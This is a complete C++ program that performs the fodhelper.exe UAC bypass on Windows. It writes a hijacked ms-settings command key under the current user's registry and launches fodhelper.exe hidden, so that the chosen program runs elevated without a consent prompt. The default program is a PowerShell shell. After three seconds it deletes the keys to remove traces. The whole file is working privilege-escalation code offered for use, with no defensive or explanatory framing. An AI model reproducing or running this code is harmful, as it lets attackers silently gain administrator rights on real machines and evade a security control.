#include <windows.h>
#include <iostream>

void FodhelperBypass(const std::string& program = "cmd /c start Powershell.exe") {
	HKEY hKey;
	LPCSTR subkey = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
	DWORD disp;
	
	// Create registry structure
	if (RegCreateKeyExA(HKEY_CURRENT_USER, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &disp) != ERROR_SUCCESS) {
		std::cerr << "Failed to create registry key." << std::endl;
		return;
	}
	
	// Set empty DelegateExecute value
	RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
	
	// Set program to launch
	RegSetValueExA(hKey, "", 0, REG_SZ, (const BYTE*)program.c_str(), program.length() + 1);
	
	// Close the key
	RegCloseKey(hKey);
	
	// Perform the bypass
	SHELLEXECUTEINFOA sei = {0};
	sei.cbSize = sizeof(SHELLEXECUTEINFO);
	sei.fMask = SEE_MASK_NOCLOSEPROCESS;
	sei.lpVerb = "open";
	sei.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
	sei.nShow = SW_HIDE;
	
	if (!ShellExecuteExA(&sei)) {
		std::cerr << "Failed to start fodhelper.exe." << std::endl;
	}
	
	// Wait for a moment before removing registry structure
	Sleep(3000);
	
	// Remove registry structure
	RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
}

int main() {
	FodhelperBypass();
	return 0;
}

